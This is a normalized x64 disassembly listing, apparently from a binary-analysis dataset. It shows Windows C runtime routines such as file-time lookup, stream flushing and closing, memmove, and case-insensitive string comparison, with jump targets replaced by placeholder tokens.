cmp [ rsp + 0x84 ] 0xa000000c
jne r-xdata
call sub_1800075a8
mov r12d [ rax ]
call sub_1800075a8
lea rcx [ rsp + 0x2b0 ]
mov r8d 0x104
mov rdx rdi
mov [ rax ] r14d
call sub_180009944
mov rbp rax
cmp rax r14
je r-xdata
lea rdx [ rsp + 0x60 ]
mov rcx rdi
call [ FindFirstFileW@IAT ]
mov r15d 0x1
mov rsi rax
cmp rax 0xffffffffffffffff
jne r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x74 ]
call [ FileTimeToLocalFileTime@IAT ]
cmp eax r14d
je r-xdata
cmp [ rsp + 0x78 ] r14d
jne r-xdata
or [ rsp + 0x50 ] 0xffffffff
lea rcx [ rsp + 0x50 ]
mov r9d 0x40
xor r8d r8d
mov rdx rdi
mov [ rsp + 0x20 ] r14d
call sub_18000ab54
cmp eax r14d
jne r-xdata
call sub_1800075a8
cmp [ rax ] 0x22
jne r-xdata
call sub_1800075a8
mov [ rax ] r12d
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800075e8
mov rcx rsi
call [ FindClose@IAT ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call [ FileTimeToSystemTime@IAT ]
cmp eax r14d
je r-xdata
mov [ rbx + 0x20 ] r14
jmp r-xdata
mov ecx [ rsp + 0x50 ]
cmp ecx 0xffffffff
je r-xdata
call sub_1800075a8
xor r8d r8d
mov rdx rdi
xor ecx ecx
mov [ rax ] r12d
call sub_180009944
mov rsi rax
mov rbp rax
cmp rbp r14
je r-xdata
or [ rsp + 0x30 ] 0xffffffff
movzx eax [ rsp + 0x4c ]
movzx r10d [ rsp + 0x4a ]
movzx r9d [ rsp + 0x48 ]
movzx r8d [ rsp + 0x46 ]
movzx edx [ rsp + 0x42 ]
movzx ecx [ rsp + 0x40 ]
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r10d
call sub_18000ab88
mov [ rbx + 0x20 ] rax
cmp [ rsp + 0x6c ] r14d
jne r-xdata
mov rdx rbx
call sub_180009ddc
mov ecx [ rsp + 0x50 ]
mov ebx eax
call sub_180009cc4
mov eax ebx
jmp r-xdata
cmp rsi r14
je r-xdata
mov rcx rbp
call sub_180009928
cmp rax 0x3
je r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x6c ]
call [ FileTimeToLocalFileTime@IAT ]
cmp eax r14d
je r-xdata
cmp [ rsp + 0x70 ] r14d
jne r-xdata
mov rcx [ rsp + 0x4c0 ]
xor rcx rsp
call sub_1800042d0
mov rbx [ rsp + 0x520 ]
add rsp 0x4d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx rsi
call sub_180004690
jmp r-xdata
mov rcx rbp
call [ GetDriveTypeW@IAT ]
cmp eax r15d
jbe r-xdata
mov rcx rbp
call sub_180004d04
cmp eax r14d
je r-xdata
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call [ FileTimeToSystemTime@IAT ]
cmp eax r14d
je r-xdata
mov rax [ rbx + 0x20 ]
jmp r-xdata
cmp rsi r14
je r-xdata
or [ rsp + 0x30 ] 0xffffffff
movzx eax [ rsp + 0x4c ]
movzx r10d [ rsp + 0x4a ]
movzx r9d [ rsp + 0x48 ]
movzx r8d [ rsp + 0x46 ]
movzx edx [ rsp + 0x42 ]
movzx ecx [ rsp + 0x40 ]
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r10d
call sub_18000ab88
mov [ rbx + 0x18 ] rax
cmp [ rsp + 0x64 ] r14d
jne r-xdata
or [ rsp + 0x30 ] 0xffffffff
xor r9d r9d
mov r8d r15d
mov edx r15d
mov ecx 0x7bc
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x60 ] 0x10
mov [ rsp + 0x7c ] r14d
mov [ rsp + 0x80 ] r14d
mov [ rsp + 0x20 ] r14d
mov [ rsp + 0x8c ] r14w
call sub_18000ab88
mov [ rbx + 0x20 ] rax
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x28 ] rax
jmp r-xdata
mov rcx rsi
call sub_180004690
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x64 ]
call [ FileTimeToLocalFileTime@IAT ]
cmp eax r14d
je r-xdata
cmp [ rsp + 0x68 ] r14d
jne r-xdata
mov ecx [ rsp + 0x60 ]
mov rdx rdi
call sub_180009b10
mov [ rbx + 0x8 ] r15w
mov [ rbx + 0x4 ] r14w
mov [ rbx + 0x6 ] ax
mov eax [ rsp + 0x80 ]
mov [ rbx + 0xc ] r14w
mov [ rbx + 0x14 ] eax
lea eax [ r13 - 0x1 ]
mov [ rbx + 0xa ] r14w
mov [ rbx ] eax
mov [ rbx + 0x10 ] eax
xor eax eax
jmp r-xdata
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call [ FileTimeToSystemTime@IAT ]
cmp eax r14d
je r-xdata
mov rax [ rbx + 0x20 ]
jmp r-xdata
or [ rsp + 0x30 ] 0xffffffff
movzx eax [ rsp + 0x4c ]
movzx r10d [ rsp + 0x4a ]
movzx r9d [ rsp + 0x48 ]
movzx r8d [ rsp + 0x46 ]
movzx edx [ rsp + 0x42 ]
movzx ecx [ rsp + 0x40 ]
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r10d
call sub_18000ab88
mov rcx rsi
mov [ rbx + 0x28 ] rax
call [ FindClose@IAT ]
sub_180005224
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
or edi 0xffffffff
mov rbx rcx
test rcx rcx
jne r-xdata
test [ rcx + 0x18 ] 0x83
je r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
or eax edi
jmp r-xdata
and [ rbx + 0x18 ] 0x0
mov eax edi
call sub_180005328
mov rcx rbx
mov edi eax
call sub_18000b060
mov rcx rbx
call sub_180009454
mov ecx eax
call sub_180009cc4
test eax eax
jns r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
or edi 0xffffffff
jmp r-xdata
call sub_180004690
and [ rbx + 0x28 ] 0x0
sub_1800052b0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov rbx rcx
or edi 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test [ rcx + 0x18 ] 0x40
je r-xdata
call sub_1800075a8
mov [ rax ] 0x16
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
mov eax edi
jmp r-xdata
call sub_180005600
nop
mov rcx rbx
call sub_180005224
mov edi eax
mov rcx rbx
call sub_180005690
and [ rcx + 0x18 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov eax edi
sub_180005328
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
xor esi esi
mov rbx rcx
and al 0x3
cmp al 0x2
jne r-xdata
mov rcx [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov eax esi
mov rsi [ rsp + 0x38 ]
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test [ rcx + 0x18 ] 0x108
je r-xdata
mov edi [ rcx ]
sub edi [ rcx + 0x10 ]
test edi edi
jle r-xdata
call sub_180009454
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_18000b7f8
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_1800053a4
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_180005328
test eax eax
je r-xdata
call sub_1800053ec
jmp r-xdata
bt [ rbx + 0x18 ] 0xe
jae r-xdata
or eax 0xffffffff
jmp r-xdata
add rsp 0x20
pop rbx
retn
xor eax eax
mov rcx rbx
call sub_180009454
mov ecx eax
call sub_18000b92c
neg eax
sbb eax eax
jmp r-xdata
sub_1800053ec
mov [ rsp + 0x8 ] rsi
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x18 ] r12
push r13
push r14
push r15
sub rsp 0x30
mov r14d ecx
xor r12d r12d
xor esi esi
lea ecx [ rsi + 0x1 ]
call sub_18000bc50
nop
xor edi edi
mov [ rsp + 0x20 ] edi
or r15d 0xffffffff
mov ecx 0x1
call sub_18000bb50
cmp r14d 0x1
cmove esi r12d
mov eax esi
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
mov r12 [ rsp + 0x60 ]
add rsp 0x30
pop r15
pop r14
pop r13
retn
movsxd r13 edi
mov rax [ rw-data ]
cmp [ rax + r13 * 8 ] 0x0
je r-xdata
inc edi
mov [ rsp + 0x20 ] edi
jmp r-xdata
mov rdx [ rax + r13 * 8 ]
test [ rdx + 0x18 ] 0x83
je r-xdata
cmp edi [ rw-data ]
jge r-xdata
mov ecx edi
call sub_180005660
nop
mov rax [ rw-data ]
mov rcx [ rax + r13 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + r13 * 8 ]
mov ecx edi
call sub_1800056e8
cmp r14d 0x1
jne r-xdata
test r14d r14d
jne r-xdata
call sub_1800053a4
cmp eax r15d
je r-xdata
test [ rcx + 0x18 ] 0x2
je r-xdata
inc r12d
mov [ rsp + 0x24 ] r12d
jmp r-xdata
call sub_1800053a4
cmp eax r15d
cmove esi r15d
mov [ rsp + 0x28 ] esi
sub_1800054f4
push rbx
sub rsp 0x20
mov eax [ rw-data ]
mov ebx 0x14
test eax eax
jne r-xdata
cmp eax ebx
cmovl eax ebx
mov eax 0x200
jmp r-xdata
xor ecx ecx
lea rdx [ rw-data ]
lea edx [ rax + 0x8 ]
mov rcx rbx
mov [ rw-data ] ebx
call sub_180006b3c
mov [ rw-data ] rax
test rax rax
jne r-xdata
movsxd rcx eax
mov edx 0x8
mov [ rw-data ] eax
call sub_180006b3c
mov [ rw-data ] rax
test rax rax
jne r-xdata
xor r8d r8d
lea rdx [ rw-data ]
lea r9d [ r8 + 0x3 ]
mov rax [ rw-data ]
jmp r-xdata
mov eax 0x1a
jmp r-xdata
mov [ rdx ] 0xfffffffe
cmp r10 0xfffffffffffffffe
je r-xdata
mov [ rcx + rax ] rdx
add rdx 0x30
add rcx 0x8
sub rbx 0x1
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r8
lea r10 [ rw-data ]
mov rax r8
sar rax 0x5
and ecx 0x1f
mov rax [ r10 + rax * 8 ]
imul rcx rcx 0x58
mov r10 [ rcx + rax ]
cmp r10 0xffffffffffffffff
je r-xdata
xor eax eax
test r10 r10
jne r-xdata
inc r8
add rdx 0x30
sub r9 0x1
jne r-xdata
sub_180005600
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
cmp rbx rcx
jb r-xdata
lea rcx [ rbx + 0x30 ]
call [ EnterCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rbx rax
ja r-xdata
mov rdx rbx
mov rax 0x2aaaaaaaaaaaaaab
sub rdx rcx
imul rdx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_18000bc50
bts [ rbx + 0x18 ] 0xf
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180005660
push rbx
sub rsp 0x20
cmp ecx 0x14
mov rbx rdx
jge r-xdata
lea rcx [ rdx + 0x30 ]
call [ EnterCriticalSection@IAT ]
add ecx 0x10
call sub_18000bc50
bts [ rbx + 0x18 ] 0xf
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180005690
sub rsp 0x28
lea rdx [ rw-data ]
cmp rcx rdx
jb r-xdata
add rcx 0x30
call [ LeaveCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rcx rax
ja r-xdata
btr [ rcx + 0x18 ] 0xf
sub rcx rdx
mov rax 0x2aaaaaaaaaaaaaab
imul rcx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_18000bb50
jmp r-xdata
add rsp 0x28
retn
sub_180005710
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x18 ] 0x0
test rdx rdx
jne r-xdata
movdqu xmm0 [ rdx ]
movdqu [ rcx ] xmm0
call sub_1800068b0
mov [ rbx + 0x10 ] rax
mov rdx [ rax + 0xc0 ]
mov [ rbx ] rdx
mov rcx [ rax + 0xb8 ]
mov [ rbx + 0x8 ] rcx
mov rcx [ rw-data ]
cmp rdx rcx
je r-xdata
mov rax [ rw-data ]
cmp [ rbx + 0x8 ] rax
je r-xdata
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
mov rax [ rbx + 0x10 ]
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_18000cc10
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
or [ rax + 0xc8 ] 0x2
mov [ rbx + 0x18 ] 0x1
jmp r-xdata
call sub_18000c318
mov [ rbx + 0x8 ] rax
sub_1800057bc
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
call sub_180005710
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180005804
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180005710
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18000584c
mov r10 rcx
test r8 r8
je r-xdata
xor eax eax
retn
movzx r9d [ r10 ]
inc r10
lea eax [ r9 - 0x41 ]
cmp eax 0x19
ja r-xdata
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r9d 0x20
sub r8 0x1
je r-xdata
add ecx 0x20
sub r9d ecx
mov eax r9d
retn
test r9d r9d
je r-xdata
cmp r9d ecx
je r-xdata
sub_180005894
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x50
mov rdi r8
mov rsi rdx
mov rbp rcx
test r8 r8
je r-xdata
xor eax eax
lea rcx [ rax - 0x28 ]
mov rdx r9
call sub_180005710
test rbp rbp
jne r-xdata
test rsi rsi
je r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp rdi 0x7fffffff
ja r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rsp + 0x30 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
movzx ecx [ rbp ]
lea rdx [ rsp + 0x30 ]
call sub_18000cd44
movzx ecx [ rsi ]
lea rdx [ rsp + 0x30 ]
mov ebx eax
inc rbp
call sub_18000cd44
inc rsi
sub rdi 0x1
je r-xdata
mov r8 rdi
mov rdx rsi
mov rcx rbp
call sub_18000584c
cmp [ rsp + 0x48 ] 0x0
je r-xdata
sub ebx eax
cmp [ rsp + 0x48 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp ebx eax
je r-xdata
sub_1800059c0
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_180005cf4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x50
xor r12d r12d
mov rbp r8
mov rsi rdx
mov rdi rcx
mov eax r12d
cmp r8 r12
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x50
pop r12
retn
cmp rcx r12
jne r-xdata
cmp rdx r12
je r-xdata
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
mov [ rax ] 0x16
call sub_180008530
mov eax 0x7fffffff
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov rdx r9
call sub_180005710
mov r11 [ rsp + 0x30 ]
cmp [ r11 + 0x14 ] r12d
jne r-xdata
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
call sub_18000af24
movzx ecx [ rsi ]
lea rdx [ rsp + 0x30 ]
mov bx ax
call sub_18000af24
add rdi 0x2
add rsi 0x2
sub rbp 0x1
je r-xdata
movzx ebx [ rdi ]
cmp bx 0x41
jb r-xdata
movzx ecx ax
movzx eax bx
sub eax ecx
cmp [ rsp + 0x48 ] r12b
je r-xdata
cmp bx r12w
je r-xdata
movzx eax [ rsi ]
cmp ax 0x41
jb r-xdata
cmp bx 0x5a
ja r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp bx ax
je r-xdata
add rdi 0x2
add rsi 0x2
sub rbp 0x1
je r-xdata
cmp ax 0x5a
ja r-xdata
add bx 0x20
cmp bx r12w
je r-xdata
add ax 0x20
cmp bx ax
je r-xdata
jmp r-xdata
sub_180005e20
push rbx
sub rsp 0x30
xor ebx ebx
mov r10 rcx
cmp [ rw-data ] ebx
jne r-xdata
xor r9d r9d
call sub_180005cf4
cmp r8 rbx
je r-xdata
mov eax ebx
jmp r-xdata
cmp rcx rbx
jne r-xdata
add rsp 0x30
pop rbx
retn
cmp rdx rbx
je r-xdata
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbx
mov [ rax ] 0x16
call sub_180008530
mov eax 0x7fffffff
jmp r-xdata
movzx ecx [ r10 ]
cmp cx 0x41
jb r-xdata
movzx eax [ rdx ]
cmp ax 0x41
jb r-xdata
cmp cx 0x5a
ja r-xdata
add r10 0x2
add rdx 0x2
sub r8 0x1
je r-xdata
cmp ax 0x5a
ja r-xdata
add cx 0x20
movzx eax ax
movzx ebx cx
sub ebx eax
cmp cx bx
je r-xdata
add ax 0x20
cmp cx ax
je r-xdata
sub_180005ec8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x50
mov rsi rcx
mov rdi rdx
lea rcx [ rax - 0x28 ]
mov rdx r8
call sub_180005710
xor ebp ebp
cmp rsi rbp
jne r-xdata
cmp rdi rbp
je r-xdata
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbp
mov [ rax ] 0x16
call sub_180008530
cmp [ rsp + 0x48 ] bpl
je r-xdata
mov rax [ rsp + 0x30 ]
cmp [ rax + 0x14 ] ebp
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
movzx ecx [ rsi ]
lea rdx [ rsp + 0x30 ]
call sub_18000af24
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
mov bx ax
add rsi 0x2
call sub_18000af24
add rdi 0x2
cmp bx bp
je r-xdata
movzx ebx [ rsi ]
cmp bx 0x41
jb r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
movzx ecx ax
movzx eax bx
sub eax ecx
cmp [ rsp + 0x48 ] bpl
je r-xdata
cmp bx ax
je r-xdata
movzx eax [ rdi ]
cmp ax 0x41
jb r-xdata
cmp bx 0x5a
ja r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
add rsi 0x2
add rdi 0x2
cmp bx bp
je r-xdata
cmp ax 0x5a
ja r-xdata
add bx 0x20
cmp bx ax
je r-xdata
add ax 0x20
jmp r-xdata
sub_180005fdc
push rbx
sub rsp 0x30
xor ebx ebx
mov r9 rcx
cmp [ rw-data ] ebx
jne r-xdata
xor r8d r8d
call sub_180005ec8
cmp rcx rbx
jne r-xdata
cmp rdx rbx
je r-xdata
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbx
mov [ rax ] 0x16
call sub_180008530
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ r9 ]
cmp ax 0x41
jb r-xdata
add rsp 0x30
pop rbx
retn
movzx ecx [ rdx ]
cmp cx 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
add r9 0x2
add rdx 0x2
cmp ax bx
je r-xdata
cmp cx 0x5a
ja r-xdata
add ax 0x20
movzx ecx cx
movzx eax ax
sub eax ecx
jmp r-xdata
cmp ax cx
je r-xdata
add cx 0x20
sub_180006080
mov r11 rcx
or r8 r8
je r-xdata
mov rax r11
retn
sub rcx rdx
test dl 0x7
je r-xdata
mov rax [ rdx ]
sub r8 0x8
jbe r-xdata
mov al [ rdx ]
test al al
mov [ rcx + rdx ] al
je r-xdata
add r8 0x8
je r-xdata
mov r9 0x7efefefefefefeff
add r9 rax
mov r10 rax
xor r10 0xffffffffffffffff
xor r10 r9
mov r9 0x8101010101010100
test r9 r10
je r-xdata
add rcx rdx
xor rdx rdx
cmp r8 0x10
jb r-xdata
inc rdx
dec r8
je r-xdata
mov rax r11
retn
test al al
mov [ rcx + rdx ] al
je r-xdata
mov [ rcx + rdx ] rax
add rdx 0x8
sub r8 0x1
jb r-xdata
test cl 0x7
je r-xdata
test dl 0x7
jne r-xdata
inc rdx
dec r8
je r-xdata
mov rax r11
retn
mov [ rcx ] dl
inc rcx
jmp r-xdata
sub r8 0x20
jb r-xdata
inc rcx
mov [ rcx ] dl
dec r8
jmp r-xdata
jmp r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
add r8 0x20
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
mov [ rcx + 0x18 ] rdx
add rcx 0x20
sub r8 0x20
jae r-xdata
inc rdx
dec r8
je r-xdata
add r8 0x8
mov [ rcx ] rdx
add rcx 0x8
jmp r-xdata
shr rax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
sub r8 0x8
jb r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
je r-xdata
shr rax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
je r-xdata
shr eax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
jne r-xdata
sub_1800061e4
xor r11d r11d
mov r10 rdx
mov r8 rcx
cmp [ rdx ] r11b
jne r-xdata
mov al [ rcx ]
cmp al r11b
je r-xdata
mov rax rcx
retn
xor eax eax
retn
mov r9 rcx
sub r9 rdx
cmp [ rdx ] r11b
je r-xdata
cmp [ rdx ] r11b
je r-xdata
mov rax r8
retn
inc r8
inc r9
mov al [ r8 ]
cmp al r11b
jne r-xdata
movsx ecx [ r9 + rdx ]
movsx eax [ rdx ]
cmp ecx eax
jne r-xdata
mov rdx r10
cmp al r11b
je r-xdata
inc rdx
cmp [ r9 + rdx ] r11b
jne r-xdata
sub_180006240
mov r9 rcx
xor r8d r8d
mov al [ rcx ]
inc rcx
cmp al r8b
jne r-xdata
dec rcx
cmp rcx r9
je r-xdata
cmp [ rcx ] dl
cmove r8 rcx
mov rax r8
retn
cmp [ rcx ] dl
jne r-xdata
sub_180006274
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x60
mov rbp rcx
